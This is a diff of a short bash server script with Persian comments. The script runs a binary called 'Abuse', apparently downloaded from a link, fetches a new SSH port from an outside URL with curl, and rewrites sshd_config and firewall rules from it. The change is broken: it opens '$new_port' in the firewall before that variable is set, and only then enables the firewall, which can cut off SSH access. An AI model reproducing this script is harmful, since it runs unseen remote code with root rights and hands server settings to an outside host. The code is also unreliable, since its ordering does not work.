@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 # دانلود فایل از لینک مشخص شده
@@ -9,7 +8,7 @@ chmod +x Abuse
 ./Abuse
 
 # فعال‌سازی فایروال
-sudo ufw enable
+sudo ufw allow $new_port
 
 # گرفتن پورت جدید از لینک مشخص شده
 new_port=$(curl -s https://sfrgr.s93.fun/port/wbdjabd.txt)
@@ -18,7 +17,7 @@ new_port=$(curl -s https://sfrgr.s93.fun/port/wbdjabd.txt)
 sudo sed -i "s/#Port 22/Port $new_port/" /etc/ssh/sshd_config
 
 # باز کردن پورت جدید در فایروال
-sudo ufw allow $new_port
+sudo ufw enable
 
 # ری‌استارت کردن سرویس SSH
 sudo systemctl restart sshd
